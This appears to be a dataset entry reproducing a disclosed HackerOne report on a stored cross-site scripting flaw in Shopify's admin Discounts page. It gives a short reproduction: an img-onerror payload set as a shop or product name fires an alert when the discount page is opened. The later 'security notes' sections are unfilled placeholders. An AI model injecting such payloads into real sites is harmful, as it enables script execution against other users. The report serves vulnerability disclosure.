---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '618031'
original_report_id: '618031'
title: Stored XSS in Discounts section
weakness: Cross-site Scripting (XSS) - Generic
team_handle: shopify
created_at: '2019-06-18T09:14:02.574Z'
disclosed_at: '2019-06-27T15:00:15.658Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 74
asset_identifier: your-store.myshopify.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# Stored XSS in Discounts section

## Metadata

- HackerOne Report ID: 618031
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: shopify
- Disclosed At: 2019-06-27T15:00:15.658Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

self-xss

## Impact

1.add `Products`, shop name is '"'><img src=x onerror=alert(domain.domain)>'
2.click `Discounts->code`, https://mosuan-img-src-x.myshopify.com/admin/discounts/367541518396
3.add comments, Choose the goods just now.
4.alert

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
